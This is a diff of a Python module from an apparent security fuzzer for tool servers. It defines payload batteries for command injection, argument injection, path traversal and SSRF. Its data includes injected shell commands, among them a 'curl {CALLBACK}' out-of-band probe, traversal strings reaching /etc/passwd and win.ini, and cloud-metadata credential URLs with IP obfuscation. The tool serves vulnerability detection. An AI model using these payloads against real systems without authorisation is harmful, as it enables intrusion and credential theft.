@@ -1,97 +1,135 @@
 """各注入类别的判定套件（battery）：技术原语 × 语境/编码/目标变体 的有序模板。
 
 见 docs/载荷合成模块设计.md 与 docs/漏洞类型与检测手段.md。
-- 每条模板 = {value, channel, control, expect, delay_target, technique}；value 里的
+- 每条模板 = {value, channel, control, expect, delay_target, technique}；value/expect 里的
   {CALLBACK}/{TOKEN} 占位符由 core 在铸造 oracle 观测物后替换。
-- 列表按"最可能命中 / 不依赖出网在前"排序，供按预算取 top-N（floor 也至少取前几条）。
-- 通道：inband（响应/报错里匹配签名，网络无关）/ timing（时延差）/ oob（带外回连）/
-  differential（与基线响应做差分）。程序感知载荷已放弃，这里全部是通用静态模板。
+- 排序：**不依赖出网、无破坏性的在前**（带内回显/差分/读文件），`sleep`/带外/写文件靠后，
+  配合按预算取 top-N，降低请求量与把服务器打慢（DoS）的风险。
+- 通道：inband（响应/报错匹配签名）/ timing（时延差）/ oob（带外回连）/
+  differential（与基线差分）/ cross_tool（写 canary 再由读工具读回）。程序感知载荷已放弃，全是通用静态模板。
+- 载荷选自 PayloadsAllTheThings / SecLists 思路，去 Windows/噪声并改为插桩，通用、不针对任何服务器。
 """
 from __future__ import annotations
 
 from mcpfuzz.sink.types import AI, CI, PT, SSRF
 
 # ---------------- 命令注入 ----------------
-# shell 语境变体：{c} 为要注入的命令。常见、易命中的在前。
-_CI_CONTEXTS = ["; {c}", "| {c}", "&& {c}", "$({c})", "`{c}`", "\n{c}\n",
-                "'; {c} #", '"; {c} #', "& {c}", "|| {c}"]
-
-# 路径穿越：读真实系统文件 /etc/passwd（稳定特征串），覆盖多种编码/深度变体。
-_PT_VALUES = [
-    "../../../../../../etc/passwd",
-    "../../../../../../../../../../etc/passwd",
-    "/etc/passwd",
-    "....//....//....//....//etc/passwd",
-    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
-    "../../../../etc/passwd",
-]
-_PT_SIGNATURES = ["root:x:0:0:", "root:x:0:0", "daemon:x:"]
-
-# SSRF：信任边界目标（云元数据有稳定签名）。
-_SSRF_META_SIGS = ["ami-id", "instance-id", "security-credentials", "meta-data", "iam/", "hostname"]
+# shell 语境变体：{c} 为要注入的命令。
+_CI_CONTEXTS = ["; {c}", "| {c}", "|| {c}", "& {c}", "&& {c}",
+                "$({c})", "`{c}`", "\n{c}\n", "'; {c} #", '"; {c} #']
+# 求值型回显：执行后出现 "{TOKEN}1681"（41*41）；若只是把输入原样回显，出现的是
+# "{TOKEN}$((41*41))"，不匹配 —— 以此区分"真执行"与"输入回显"，避免误报。
+_CI_ECHO = "echo {TOKEN}$((41*41))"
+_CI_ECHO_IFS = "echo${IFS}{TOKEN}$((41*41))"   # 空格被过滤时的绕过
+_CI_ECHO_EXPECT = ["{TOKEN}1681"]
 
 
 def _ci_battery() -> list[dict]:
     out = []
+    # 1) 带内求值回显（网络无关、无破坏性、最先发）
     for ctx in _CI_CONTEXTS:
-        # inband：回显唯一 token（网络无关，最稳）
-        out.append({"value": ctx.format(c="echo {TOKEN}"), "channel": "inband",
-                    "expect": None, "control": None, "delay_target": 0.0,
+        out.append({"value": ctx.format(c=_CI_ECHO), "channel": "inband",
+                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
                     "technique": f"ci:echo:{ctx[:4]}"})
-        # timing：盲判，无需出网；对照为同语境的零延时
-        out.append({"value": ctx.format(c="sleep 5"), "channel": "timing",
-                    "expect": None, "control": ctx.format(c="sleep 0"), "delay_target": 5.0,
-                    "technique": f"ci:sleep:{ctx[:4]}"})
-        # oob：带外回连
+    # 1b) 空格绕过变体
+    for ctx in ("; {c}", "|{c}"):
+        out.append({"value": ctx.format(c=_CI_ECHO_IFS), "channel": "inband",
+                    "expect": list(_CI_ECHO_EXPECT), "control": None, "delay_target": 0.0,
+                    "technique": f"ci:echo-ifs:{ctx[:3]}"})
+    # 2) 带外回连
+    for ctx in _CI_CONTEXTS:
         out.append({"value": ctx.format(c="curl {CALLBACK}"), "channel": "oob",
                     "expect": None, "control": None, "delay_target": 0.0,
                     "technique": f"ci:curl:{ctx[:4]}"})
-    # cross_tool：写 canary 文件到 /tmp/{token}，再由读工具读回（网络无关、无需回显）。
-    # 排在末尾（低优先）：仅当目标服务存在配套读文件工具、且前面通道未确认时才真正发挥作用。
+    # 3) 时间盲判（会拖慢，靠后）
+    for ctx in _CI_CONTEXTS:
+        out.append({"value": ctx.format(c="sleep 5"), "channel": "timing",
+                    "expect": None, "control": ctx.format(c="sleep 0"), "delay_target": 5.0,
+                    "technique": f"ci:sleep:{ctx[:4]}"})
+    # 4) cross_tool：写 canary 到 /tmp/{token}，再由读工具读回（内容含 token）
     for ctx in _CI_CONTEXTS[:3]:
-        out.append({"value": ctx.format(c="echo {TOKEN} > /tmp/{TOKEN}"), "channel": "cross_tool",
+        out.append({"value": ctx.format(c="echo {TOKEN}$((41*41)) > /tmp/{TOKEN}"), "channel": "cross_tool",
                     "expect": None, "control": None, "delay_target": 0.0,
                     "technique": f"ci:writecanary:{ctx[:4]}"})
     return out
 
 
+# ---------------- 参数注入 ----------------
 def _ai_battery() -> list[dict]:
-    # 程序无关：未知选项带 token（报错回显即证"被当选项解析"）在前；再 --version/--help 差分。
-    return [
-        {"value": "--mcpf-probe-{TOKEN}", "channel": "inband", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ai:unknown-option"},
-        {"value": "--mcpf-probe-{TOKEN}=1", "channel": "inband", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ai:unknown-option-eq"},
-        {"value": "--version", "channel": "differential", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ai:--version"},
-        {"value": "--help", "channel": "differential", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ai:--help"},
-        {"value": "-h", "channel": "differential", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ai:-h"},
+    # 未知选项带 token（报错回显该选项即证"被当选项解析"，程序无关、可靠）在前；
+    # 再 --version/--help 等良性特征选项差分。写文件型选项程序相关、内容不可控，暂不纳入。
+    # reflection_safe=False：token 就在选项名里，被原样回显也会出现 → 命中须有 "unknown option"
+    # 类错误指纹佐证（证明被 argv 解析器当选项拒绝）才算确认，否则仅弱证据，避免输入回显误报。
+    out = [
+        {"value": "--mcpf{TOKEN}", "channel": "inband", "expect": None, "control": None,
+         "delay_target": 0.0, "technique": "ai:unknown-long", "reflection_safe": False},
+        {"value": "--mcpf{TOKEN}=1", "channel": "inband", "expect": None, "control": None,
+         "delay_target": 0.0, "technique": "ai:unknown-long-eq", "reflection_safe": False},
+        {"value": "-mcpf{TOKEN}", "channel": "inband", "expect": None, "control": None,
+         "delay_target": 0.0, "technique": "ai:unknown-short", "reflection_safe": False},
     ]
+    for opt in ("--version", "-V", "--help", "-h", "--usage"):
+        out.append({"value": opt, "channel": "differential", "expect": None, "control": None,
+                    "delay_target": 0.0, "technique": f"ai:{opt}"})
+    return out
+
+
+# ---------------- 路径穿越 ----------------
+_PT_PASSWD_SIGS = ["root:x:0:0:", "root:x:0:0", "daemon:x:"]
+_PT_WIN_SIGS = ["[fonts]", "[extensions]", "for 16-bit app support"]
+_PT_PASSWD = [
+    "../../../../../../etc/passwd",
+    "../../../../../../../../../../etc/passwd",
+    "../../../../etc/passwd",
+    "/etc/passwd",
+    "....//....//....//....//etc/passwd",
+    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",                     # URL 编码
+    "..%252f..%252f..%252f..%252fetc%252fpasswd",               # 双重编码
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "..\\..\\..\\..\\..\\..\\etc\\passwd",                       # 反斜杠分隔
+    "../../../../../../etc/passwd%00",                           # 空字节截断(历史)
+    "../../../../../../etc/passwd\x00.png",
+]
+_PT_WIN = [
+    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+    "../../../../../../windows/win.ini",
+    "....\\....\\....\\....\\windows\\win.ini",
+]
 
 
 def _pt_battery() -> list[dict]:
-    return [{"value": v, "channel": "inband", "expect": list(_PT_SIGNATURES),
-             "control": None, "delay_target": 0.0, "technique": f"pt:{v[:18]}"}
-            for v in _PT_VALUES]
+    out = [{"value": v, "channel": "inband", "expect": list(_PT_PASSWD_SIGS), "control": None,
+            "delay_target": 0.0, "technique": f"pt:passwd:{v[:16]}"} for v in _PT_PASSWD]
+    out += [{"value": v, "channel": "inband", "expect": list(_PT_WIN_SIGS), "control": None,
+             "delay_target": 0.0, "technique": f"pt:win:{v[:16]}"} for v in _PT_WIN]
+    return out
+
+
+# ---------------- SSRF ----------------
+# 云元数据特征（命中即越过信任边界 → 强证据）。ami-id/instance-id 等为 IMDS 专有，噪声低。
+_SSRF_META_SIGS = ["ami-id", "instance-id", "security-credentials", "AccessKeyId",
+                   "InstanceProfile", "public-keys", "owner-account-id", "iam/"]
 
 
 def _ssrf_battery() -> list[dict]:
     out = [
-        # 带外回连：服务端去请求我方 token（证明"发起了请求"；须配边界判别，弱）。
-        # {CALLBACK} 已是完整 URL（含 scheme），不要再加 http:// 前缀。
-        {"value": "{CALLBACK}", "channel": "oob", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ssrf:oob"},
-        {"value": "{CALLBACK}/x", "channel": "oob", "expect": None,
-         "control": None, "delay_target": 0.0, "technique": "ssrf:oob-path"},
+        # 带外回连（证明服务端发起了请求；须配边界判别，弱）。{CALLBACK} 已是完整 URL。
+        {"value": "{CALLBACK}", "channel": "oob", "expect": None, "control": None,
+         "delay_target": 0.0, "technique": "ssrf:oob"},
+        {"value": "{CALLBACK}/x", "channel": "oob", "expect": None, "control": None,
+         "delay_target": 0.0, "technique": "ssrf:oob-path"},
     ]
-    # 信任边界：云元数据端点（有稳定签名 → inband 强证据）
+    # 信任边界：云元数据端点（含 IP 变形绕过）+ 阿里云
     for url in ("http://169.254.169.254/latest/meta-data/",
                 "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-                "http://metadata.google.internal/computeMetadata/v1/"):
+                "http://2852039166/latest/meta-data/",       # 169.254.169.254 十进制
+                "http://0xA9FEA9FE/latest/meta-data/",        # 十六进制
+                "http://100.100.100.200/latest/meta-data/"):  # 阿里云
         out.append({"value": url, "channel": "inband", "expect": list(_SSRF_META_SIGS),
-                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:24]}"})
+                    "control": None, "delay_target": 0.0, "technique": f"ssrf:meta:{url[:26]}"})
+    # file:// 协议读本地文件（抓取器若支持 file scheme → 返回 /etc/passwd）
+    out.append({"value": "file:///etc/passwd", "channel": "inband", "expect": list(_PT_PASSWD_SIGS),
+                "control": None, "delay_target": 0.0, "technique": "ssrf:file"})
     return out
 
 
